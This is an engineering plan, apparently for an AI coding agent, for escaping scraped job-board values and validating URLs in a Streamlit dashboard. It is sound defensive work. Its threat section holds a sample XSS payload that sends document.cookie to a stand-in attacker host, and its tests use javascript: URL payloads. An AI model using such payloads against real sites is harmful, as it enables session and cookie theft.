# Plan 004: Escape scraped values in the Streamlit dashboard

> **Executor instructions**: Follow this plan step by step. Run every
> verification command and confirm the expected result before moving to the
> next step. If anything in the "STOP conditions" section occurs, stop and
> report — do not improvise. When done, update the status row for this plan
> in `plans/README.md`.
>
> **Drift check (run first)**:
> `git diff --stat ee9a6e2..HEAD -- dashboard.py`
> If `dashboard.py` changed since this plan was written, compare the
> "Current state" excerpts against the live code; on mismatch, STOP.
>
> **SHA note**: Plan 001 (executed 2026-07-01) rewrote every commit SHA via
> `git filter-repo`. The original `Planned at` commit `29244f6` was replaced
> by its rewritten equivalent `ee9a6e2` (same tree, same message). All
> SHAs in this plan use the new value.

## Status

- **Priority**: P2
- **Effort**: M
- **Risk**: LOW
- **Depends on**: 002 (test baseline — useful but not strictly required)
- **Category**: security
- **Planned at**: commit `29244f6` / rewritten `ee9a6e2`, 2026-06-30

## Why this matters

`dashboard.py` uses `st.markdown(..., unsafe_allow_html=True)` in **29
places**. Many of those interpolate scraped fields directly into HTML:
job title, company, location, URL, recommendation, missing-reasons. The
scraped values come from third-party job boards — the dashboard owner
does not control them.

Concrete risks:

- A scraped location like `Berlin<script>fetch('http://attacker/?'+document.cookie)</script>`
  would execute when the dashboard renders. The dashboard runs in the
  user's own browser at localhost, but other browser tabs share cookies
  for the same hostname (`localhost`) — a Streamlit session token or any
  cookied service on localhost is reachable.
- A scraped URL of the form `javascript:alert(1)` placed in the platform
  links would execute on click — same blast radius as above.
- HTML injection that's not actively malicious can still corrupt the layout
  (an unclosed `<div>` from a scraped description fragment misformats the
  whole page).

This is low-likelihood (job boards don't typically inject), but the fix is
mechanical and the defense-in-depth is worth the small cost.

After this plan: every scraped string interpolated into an
`unsafe_allow_html=True` block is passed through `html.escape`, and every
URL is validated to be `http(s)://` before being placed into an `href` or
markdown link.

## Current state

`dashboard.py` interpolates the following scraped fields into
`unsafe_allow_html=True` blocks. Line numbers from HEAD `ee9a6e2`:

| Field          | Source                | Used at lines                                |
|----------------|-----------------------|-----------------------------------------------|
| `location`     | scraper / DB          | 276 (`get_region_badge`), 509, 711           |
| `company`      | scraper / DB          | 393, 715                                     |
| `job_title`    | scraper / DB          | 394, 525, 714                                |
| `platform`     | scraper / DB          | 395, 528, 717                                |
| `work_mode`    | LLM / DB              | 526, 716                                     |
| `contract_type`| LLM / DB              | 527, 716                                     |
| `match_reasons`| LLM / DB              | 552, 723                                     |
| `missing`      | LLM / DB              | 558, 729                                     |
| `recommendation`| LLM / DB             | 498-499, 700-701                             |
| `pl_url` (job URL) | scraper / DB      | 543 (`href`), 734 (`href`)                   |
| `pl_name`      | scraper                | 545                                           |

Example unsafe block (`dashboard.py:537-545`):
```python
if platform_links:
    for pl in platform_links:
        pl_name = pl.get("platform", "Apply")
        pl_url  = pl.get("url", "")
        if pl_url:
            st.markdown(
                f'<a href="{pl_url}" target="_blank" class="apply-link">'
                f'Apply on {pl_name}</a>',
                unsafe_allow_html=True
            )
```

`pl_url` flows straight into the `href` attribute with no validation.
A scraped URL of `javascript:alert(1)` or `data:text/html,...` would
execute.

The same pattern repeats at line 734 for `nm_url`.

`st.expander(...)` labels (lines 489, 691) are plain-text by default and
do NOT execute HTML — those are safe and out of scope.

Streamlit `st.text_input(...)` and `st.text_area(...)` values are also
plain-text — out of scope.

## Commands you will need

| Purpose       | Command                              | Expected on success |
|---------------|--------------------------------------|---------------------|
| Import test   | `python -c "import dashboard"`       | no traceback        |
| Visual smoke  | `streamlit run dashboard.py`         | (manual — see below)|
| Run tests     | `pytest -q`                          | exit 0 (if plan 002 landed) |

## Scope

**In scope** (the only files you should modify):

- `dashboard.py` — add escaping and URL validation.

**Out of scope** (do NOT touch):

- `nodes/*` — escaping at the source is *more* defensive but couples
  storage to a single renderer. The fix belongs at the renderer boundary.
- `st.text_input` / `st.text_area` / `st.expander` labels — these are
  plain-text in Streamlit and not vulnerable.
- The CSS `<style>` block at top — that's static, not interpolated.
- Adding a Content-Security-Policy header — Streamlit doesn't expose
  response headers ergonomically; that's a separate (much larger) plan.

## Git workflow

- Branch: `advisor/004-escape-dashboard`.
- One commit fine. Message: `escape scraped values in dashboard HTML`.
- Do NOT push or open a PR unless the operator asks.

## Steps

### Step 1: Add the helpers at module top

Near the top of `dashboard.py` (after the existing `import os` line, before
`init_db()`), add:

```python
import html
from urllib.parse import urlparse


def _esc(value) -> str:
    """HTML-escape a value for safe interpolation into unsafe_allow_html blocks."""
    return html.escape("" if value is None else str(value), quote=True)


def _safe_url(value) -> str:
    """Return value only if it is an http(s) URL; empty string otherwise.

    Prevents javascript:/data:/file: URLs scraped from third-party boards
    from being placed into an href attribute.
    """
    if not value:
        return ""
    s = str(value).strip()
    try:
        parsed = urlparse(s)
    except ValueError:
        return ""
    if parsed.scheme in ("http", "https") and parsed.netloc:
        return s
    return ""
```

**Verify**:
```
python -c "from dashboard import _esc, _safe_url; print(_esc('<x>'), _safe_url('javascript:1'), _safe_url('https://x.de/j/1'))"
```
→ prints `&lt;x&gt;  https://x.de/j/1` (note the empty string in the middle).

### Step 2: Escape values in `get_region_badge`

`dashboard.py:271-276`:
```python
def get_region_badge(location: str) -> str:
    loc_lower = location.lower()
    for key, (label, css) in REGION_BADGE.items():
        if key in loc_lower:
            return f'<span class="badge {css}">{label}</span>'
    return f'<span class="badge badge-other">{location[:15]}</span>'
```

`label` and `css` come from the hard-coded `REGION_BADGE` dict — safe.
The fallback `location[:15]` is scraped. Replace the last `return` with:
```python
    return f'<span class="badge badge-other">{_esc(location[:15])}</span>'
```

**Verify**: `python -c "from dashboard import get_region_badge; print(get_region_badge('<script>alert(1)</script>'))"`
→ output contains `&lt;script&gt;`, not raw `<script>`.

### Step 3: Escape interpolated fields in the matched-jobs page

In the `render_jobs(...)` function (starts around line 462), wrap every
scraped value inside an `unsafe_allow_html=True` block with `_esc(...)`:

Around line 509 (the location render):
```python
st.markdown(
    f"{region_badge} &nbsp; "
    f'<span style="color:#8b949e; font-size:13px;">{_esc(location)}</span>',
    unsafe_allow_html=True
)
```
(`region_badge` is the already-built HTML from Step 2 — do NOT escape it.)

Around lines 525-528:
```python
st.markdown(f"**Role** &nbsp; {_esc(job_title)}", unsafe_allow_html=True)
st.markdown(f"**Work Mode** &nbsp; {_esc(work_mode)}", unsafe_allow_html=True)
st.markdown(f"**Contract** &nbsp; {_esc(contract_type)}", unsafe_allow_html=True)
st.markdown(f"**Platform** &nbsp; {_esc(platform)}", unsafe_allow_html=True)
```

Around line 498-499 (the score/recommendation header):
```python
st.markdown(f"""
<div style="margin-bottom:4px;">
    <span style="font-size:22px; font-weight:700;
                 color:{score_color};">{match_score}%</span>
    <span style="color:#8b949e; font-size:13px;
                 margin-left:8px;">{_esc(recommendation)}</span>
</div>
...
""", unsafe_allow_html=True)
```
(`match_score` and `score_color` are integers/hardcoded colors — safe.)

Around lines 537-546 (the Apply link — the URL one):
```python
if platform_links:
    for pl in platform_links:
        pl_name = pl.get("platform", "Apply")
        pl_url  = _safe_url(pl.get("url", ""))
        if pl_url:
            st.markdown(
                f'<a href="{_esc(pl_url)}" target="_blank" class="apply-link">'
                f'Apply on {_esc(pl_name)}</a>',
                unsafe_allow_html=True
            )
```
Note both `_safe_url` (validates scheme) AND `_esc` (handles ampersands in
URLs).

The reasons/missing markdown loops (lines 549-558) use `st.markdown(f"  • {r}")`
WITHOUT `unsafe_allow_html=True`. Streamlit's default markdown escapes raw
HTML, so these are safe — leave them.

### Step 4: Escape interpolated fields in the My Applications page

In the `if page == "📊  My Applications":` block (around line 386-417), the
applications expander uses `st.markdown(..., unsafe_allow_html=True)` for
each field. Apply the same treatment:

- Line 393: `f"**Company** &nbsp; {_esc(row['company'])}"`
- Line 394: `f"**Role** &nbsp; {_esc(row['job_title'])}"`
- Line 395: `f"**Platform** &nbsp; {_esc(row['platform'])}"`
- Line 396: `f"**Applied** &nbsp; {_esc(row['date_applied'])}"`
- Line 397: `f"**Status** &nbsp; {icon} {_esc(row['status'])}"`
- Line 399: the job_url link — wrap with `_safe_url`:
  ```python
  safe = _safe_url(row["job_url"])
  if safe:
      st.markdown(f"**Link** &nbsp; [Open job posting]({safe})", unsafe_allow_html=True)
  ```
  (Plain markdown-link syntax — the `[](...)` form — does NOT execute
  `javascript:` schemes in Streamlit's renderer, but `_safe_url` makes it
  explicit.)

### Step 5: Escape interpolated fields in the Not Matched page

In the `elif page == "❌  Not Matched":` block, lines 700-734, apply the
same treatment:

- Line 700-701 (score/recommendation header): `_esc(nm_recommendation)`.
- Line 711: `_esc(nm_location)`.
- Line 714: `_esc(nm_title)`.
- Line 715: `_esc(nm_company)`.
- Line 716: `_esc(nm_work_mode)` and `_esc(nm_contract)`.
- Line 717: `_esc(nm_platform)`.
- Lines 732-737 (the URL block):
  ```python
  if nm_url:
      safe = _safe_url(nm_url)
      if safe:
          st.markdown(
              f'<a href="{_esc(safe)}" target="_blank" class="apply-link">'
              f'View on {_esc(nm_platform)}</a>',
              unsafe_allow_html=True
          )
  ```

### Step 6: Manual smoke test (operator must do this)

Add a row to `data/applications.db`'s `matched_jobs` table with a malicious
title for visual confirmation — or just trust the imports below. The
quickest non-DB way:

```
python -c "
from dashboard import _esc, _safe_url, get_region_badge
print(repr(_esc('<script>alert(1)</script>')))
print(repr(_safe_url('javascript:alert(1)')))
print(repr(_safe_url('https://example.com/job/1')))
print(repr(get_region_badge('Berlin<script>x</script>')))
"
```

**Expected output** (each line):
```
'&lt;script&gt;alert(1)&lt;/script&gt;'
''
'https://example.com/job/1'
'<span class="badge badge-east">Berlin</span>'      # matched a region
```

(Last line may match `badge-east` since 'berlin' is a key in `REGION_BADGE`.
The point: the input's `<script>` was NOT propagated to the output. If you
test a non-region location like `Foo<script>x</script>` you should see the
escaped form in the output.)

### Step 7: Streamlit launch sanity check

```
streamlit run dashboard.py --server.headless true
```

Wait ~5 seconds and confirm no exceptions appear in stdout. Then Ctrl+C.

**Verify**: stdout shows "You can now view your Streamlit app in your
browser." and no Python tracebacks.

### Step 8: Run the test suite (if plan 002 has landed)

```
pytest -q
```

**Expected**: exit 0. (This plan only touches `dashboard.py`, which the
baseline tests do not target. Tests should be unaffected.)

If plan 002 has NOT landed, skip this step.

## Test plan

- Optional (recommended): create `tests/test_dashboard_helpers.py`
  exercising the two new helpers. Cases:
  - `_esc("<script>")` returns `&lt;script&gt;`.
  - `_esc(None)` returns `""`.
  - `_esc(42)` returns `"42"`.
  - `_safe_url("https://x.de/j")` returns the input.
  - `_safe_url("http://x.de/j")` returns the input.
  - `_safe_url("javascript:alert(1)")` returns `""`.
  - `_safe_url("data:text/html,foo")` returns `""`.
  - `_safe_url("")` returns `""`.
  - `_safe_url(None)` returns `""`.
  - `_safe_url("not a url")` returns `""`.
  - `_safe_url("//cdn.example.com/x")` returns `""` (no scheme).

  Use the same `tests/conftest.py` pattern from plan 002.

  Verification: `pytest -q tests/test_dashboard_helpers.py` → all pass.

## Done criteria

ALL must hold:

- [ ] `dashboard.py` imports `html` and `urlparse`.
- [ ] `dashboard.py` defines `_esc` and `_safe_url` at module scope.
- [ ] Every interpolation of `location`, `company`, `job_title`, `platform`,
      `work_mode`, `contract_type`, `recommendation`, `nm_*` (their
      not-matched siblings), and `pl_name` inside any `unsafe_allow_html=True`
      block passes through `_esc(...)`.
- [ ] Every URL placed into an `href=` attribute or markdown link is
      validated by `_safe_url(...)` first.
- [ ] `python -c "from dashboard import _esc, _safe_url; print(_esc('<x>'), _safe_url('javascript:1'))"`
      prints `&lt;x&gt;` and an empty string.
- [ ] `streamlit run dashboard.py --server.headless true` launches without
      Python traceback (Ctrl+C after ~5s to stop).
- [ ] `pytest -q` exits 0 (if plan 002 is in place).
- [ ] `git status --porcelain` shows changes ONLY in `dashboard.py` (plus
      optionally `tests/test_dashboard_helpers.py` and `plans/README.md`).
- [ ] `plans/README.md` status row updated to DONE.

## STOP conditions

Stop and report (do not improvise) if:

- You discover an interpolation site this plan missed (look for any
  `st.markdown(f"..."` followed by `unsafe_allow_html=True` where the
  f-string includes a Python variable). List them and continue only after
  the operator confirms whether to escape them.
- You feel the urge to escape `region_badge` or `score_bar_fill` or other
  helper-built HTML — STOP, those are HTML you constructed, not user input.
  Escaping them would double-encode and break rendering.
- `streamlit run` raises a Python exception that wasn't there before the
  changes — restore from git and report.

## Maintenance notes

For the human/agent who owns this code after the change lands:

- New scraped fields added to the dashboard MUST go through `_esc`. A
  reviewer's job on any dashboard PR is to grep for new f-strings inside
  `unsafe_allow_html=True` blocks and check each interpolation.
- If the dashboard ever moves off Streamlit (e.g. FastAPI + Jinja2), Jinja's
  autoescape handles this — but the `_safe_url` URL-scheme check is still
  worth keeping.
- For real defense, also consider running the dashboard behind a CSP that
  blocks inline event handlers. Streamlit doesn't make this easy; a reverse
  proxy (Caddy/nginx) is the pragmatic place to add it.
- If you ever build the dashboard for sharing (multi-user), this becomes
  P0, not P2 — the cookie-stealing scenario from "Why this matters" goes
  from theoretical to immediate.
